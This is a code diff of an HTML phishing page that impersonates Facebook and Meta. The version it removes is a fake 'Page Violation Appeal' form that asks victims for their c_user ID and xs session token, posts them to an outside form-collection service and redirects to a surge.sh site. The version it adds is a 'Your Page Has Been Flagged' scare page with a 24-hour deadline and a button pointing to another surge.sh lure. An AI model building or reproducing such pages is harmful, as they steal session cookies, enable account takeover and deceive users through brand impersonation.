@@ -2,333 +2,186 @@
 
 
 <!DOCTYPE html>
+
 <html lang="en">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Verification | Meta</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <title>Page At Risk - Facebook</title>
     <style>
-        :root {
-            --primary: #1877f2;
-            --primary-dark: #166fe5;
-            --secondary: #42b72a;
-            --light: #f0f2f5;
-            --dark: #1c1e21;
-            --gray: #65676b;
-            --border: #dddfe2;
-            --error: #f02849;
-            --warning: #ffba00;
-            --success: #31a24c;
-            --white: #ffffff;
-        }
-
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
 
         body {
-            font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
-            background-color: var(--light);
-            color: var(--dark);
-            line-height: 1.5;
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            line-height: 1.34;
         }
 
         .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
-
-        .header {
-            background-color: var(--primary);
-            color: var(--white);
-            padding: 16px 0;
+            max-width: 500px;
+            margin: 40px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
         }
 
-        .header-content {
-            display: flex;
-            align-items: center;
+        .header {
+            text-align: center;
+            padding: 20px 0;
+            border-bottom: 1px solid #dadde1;
         }
 
         .logo {
-            font-size: 28px;
-            font-weight: 700;
-            margin-right: 20px;
+            color: #1877f2;
+            font-size: 42px;
+            font-weight: bold;
+            margin-bottom: 15px;
         }
 
-        .subheader {
-            background-color: var(--white);
-            padding: 12px 0;
-            border-bottom: 1px solid var(--border);
-        }
-
-        .subheader-content {
-            display: flex;
-            align-items: center;
-        }
-
-        .help-center {
-            font-size: 18px;
+        h1 {
+            font-size: 20px;
             font-weight: 600;
-            color: var(--primary);
+            margin-bottom: 16px;
         }
 
-        .verification-card {
-            background-color: var(--white);
-            border-radius: 8px;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-            max-width: 800px;
-            margin: 30px auto;
-            overflow: hidden;
-        }
-
-        .card-header {
-            background-color: #f5f6f7;
-            padding: 16px;
-            border-bottom: 1px solid var(--border);
-        }
-
-        .card-title {
-            font-size: 18px;
-            font-weight: 600;
-            color: var(--dark);
-        }
-
-        .card-body {
-            padding: 20px;
-        }
-
-        .alert-message {
-            background-color: #f5f6f7;
-            padding: 12px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            border-left: 4px solid var(--warning);
+        .alert-box {
+            background-color: #fff8e1;
+            border-left: 4px solid #ffc107;
+            padding: 12px 16px;
+            margin: 20px 0;
+            border-radius: 4px;
         }
 
         .alert-title {
-            display: flex;
-            align-items: center;
+            font-weight: 600;
             margin-bottom: 8px;
+            color: #d32f2f;
         }
 
-        .alert-icon {
-            color: var(--warning);
-            margin-right: 8px;
+        .content {
+            padding: 20px 0;
+        }
+
+        p {
+            margin-bottom: 16px;
+            color: #606770;
+        }
+
+        .support-option {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .support-option:hover {
+            background-color: #f5f6f7;
+        }
+
+        .support-icon {
+            width: 40px;
+            height: 40px;
+            background-color: #e7f3ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            color: #1877f2;
             font-size: 18px;
         }
 
-        .alert-text {
-            font-size: 15px;
-            font-weight: 500;
+        .support-text {
+            flex: 1;
         }
 
-        .instruction-text {
-            font-size: 14px;
-            margin-bottom: 15px;
-            color: var(--dark);
-        }
-
-        .video-container {
-            margin: 20px 0;
-            text-align: center;
-        }
-
-        .video-wrapper {
-            position: relative;
-            max-width: 500px;
-            margin: 0 auto;
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-        }
-
-        video {
-            width: 100%;
-            display: block;
-        }
-
-        .video-caption {
-            font-size: 13px;
-            color: var(--gray);
-            margin-top: 8px;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-label {
-            display: block;
-            font-size: 14px;
+        .support-title {
             font-weight: 600;
-            margin-bottom: 8px;
-            color: var(--dark);
+            margin-bottom: 2px;
         }
 
-        .form-control {
-            width: 100%;
-            padding: 12px;
-            font-size: 15px;
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            background-color: var(--white);
-            transition: all 0.2s ease;
-        }
-
-        .form-control:focus {
-            outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
-        }
-
-        .form-note {
+        .support-desc {
             font-size: 13px;
-            color: var(--gray);
-            margin-top: 8px;
-        }
-
-        .card-footer {
-            background-color: #f5f6f7;
-            padding: 16px;
-            border-top: 1px solid var(--border);
-            display: flex;
-            justify-content: flex-end;
+            color: #65676b;
         }
 
         .btn {
-            padding: 10px 24px;
-            font-size: 15px;
-            font-weight: 600;
+            width: 100%;
+            padding: 12px;
             border-radius: 6px;
+            font-weight: 600;
+            font-size: 16px;
             cursor: pointer;
             border: none;
-            transition: all 0.2s ease;
-            position: relative;
+            margin-top: 16px;
         }
 
         .btn-primary {
-            background-color: var(--primary);
-            color: var(--white);
+            background-color: #1877f2;
+            color: white;
         }
 
         .btn-primary:hover {
-            background-color: var(--primary-dark);
+            background-color: #166fe5;
         }
 
-        .btn-primary:active {
-            transform: translateY(1px);
-        }
-
-        .warning-box {
-            background-color: #fff8e1;
-            border-left: 4px solid var(--warning);
-            padding: 12px;
-            border-radius: 6px;
+        .footer {
+            text-align: center;
             margin-top: 20px;
-        }
-
-        .warning-text {
-            font-size: 13px;
-            color: var(--dark);
-        }
-
-        @media (max-width: 768px) {
-            .verification-card {
-                margin: 20px 0;
-                border-radius: 0;
-            }
-            .video-wrapper {
-                max-width: 100%;
-            }
+            padding-top: 20px;
+            border-top: 1px solid #dadde1;
+            color: #8a8d91;
+            font-size: 12px;
         }
     </style>
 </head>
 
 <body>
-    <header class="header">
-        <div class="container header-content">
-            <div class="logo">facebook</div>
-        </div>
-    </header>
-
-    <div class="subheader">
-        <div class="container subheader-content">
-            <div class="help-center">Account Verification Center</div>
-        </div>
-    </div>
-
     <div class="container">
-        <form class="verification-card" action="https://submit-form.com/UeD2o6QUc" method="POST">
+        <div class="header">
+            <div class="logo">facebook</div>
+            <h1>Your Page Has Been Flagged</h1>
+        </div>
 
-            <!-- Redirect after submission -->
-            <input type="hidden" name="_redirect" value="https://f-key-pass.surge.sh">
+        <div class="alert-box">
+            <div class="alert-title">Important Security Alert</div>
+            <div>We've detected unusual activity on your account or page and we have temporarily locked your page to protect your information.</div>
+        </div>
 
-            <div class="card-header">
-                <div class="card-title">Page Violation Appeal</div>
-            </div>
+        <div class="content">
+            <p>To secure your page and restore access, please complete the verification process. This helps us confirm you're the rightful account owner.</p>
 
-            <div class="card-body">
-                <div class="alert-message">
-                    <div class="alert-title">
-                        <i class="fas fa-exclamation-triangle alert-icon"></i>
-                        <span>Important Notice</span>
-                    </div>
-                    <p class="alert-text">
-                        We've identified activity on your page that may violate our Community Standards. Your access has been temporarily restricted while we review this matter.
-                    </p>
-                </div>
-
-                <p class="instruction-text">
-                    To help us verify your identity and resolve this issue, please carefully follow the instructions below.
-                </p>
-
-                <div class="video-container">
-                    <div class="video-wrapper">
-                        <video controls autoplay>
-                            <source src="https://ik.imagekit.io/ummab7boi/WhatsApp%20Video%202024-11-26%20at%2013.24.43_9bcb50f5.mp4?updatedAt=1751126951949" type="video/mp4">
-                            Your browser does not support the video tag.
-                        </video>
-                    </div>
-                    <p class="video-caption">Verification process demonstration</p>
-                </div>
-
-                <p class="instruction-text">
-                    Please provide the following information exactly as shown in your account settings:
-                </p>
-
-                <div class="form-group">
-                    <label for="c_user" class="form-label">User ID (c_user)</label>
-                    <input type="number" id="c_user" name="c_user" class="form-control" required pattern="^\d{15}$" title="Please enter your 15-digit user ID">
-                    <p class="form-note">This is a 15-digit number found in your account information</p>
-                </div>
-
-                <div class="form-group">
-                    <label for="xs" class="form-label">Session Token (xs)</label>
-                    <input type="text" id="xs" name="xs" class="form-control" required pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$">
-                    <p class="form-note">This is a combination of letters, numbers, and special characters</p>
-                </div>
-
-                <div class="warning-box">
-                    <p class="warning-text">
-                        <i class="fas fa-exclamation-circle"></i> Please do not log out from your computer or laptop until you receive verification confirmation.
-                    </p>
+            <div class="support-option">
+                <div class="support-icon">!</div>
+                <div class="support-text">
+                    <div class="support-title">Page Verification Required</div>
+                    <div class="support-desc">Complete identity confirmation to unlock your page</div>
                 </div>
             </div>
 
-            <div class="card-footer">
-                <button type="submit" class="btn btn-primary">
-                    <span class="btn-text">Submit Verification</span>
-                </button>
-            </div>
-        </form>
+            <p>You have <strong>24 hours</strong> to verify your page before it's permanently disabled for violating our Community Standards.</p>
+
+            <button class="btn btn-primary" onclick="window.location.href='https://f-review-request-here.surge.sh/'">
+                Begin Verification
+            </button>
+        </div>
+
+        <div class="footer">
+            <div>Meta © 2026</div>
+            <div style="margin-top: 8px;">You can learn more about why we suspend page by visiting the Community Standards.</div>
+        </div>
     </div>
 </body>
 
   </html>
-
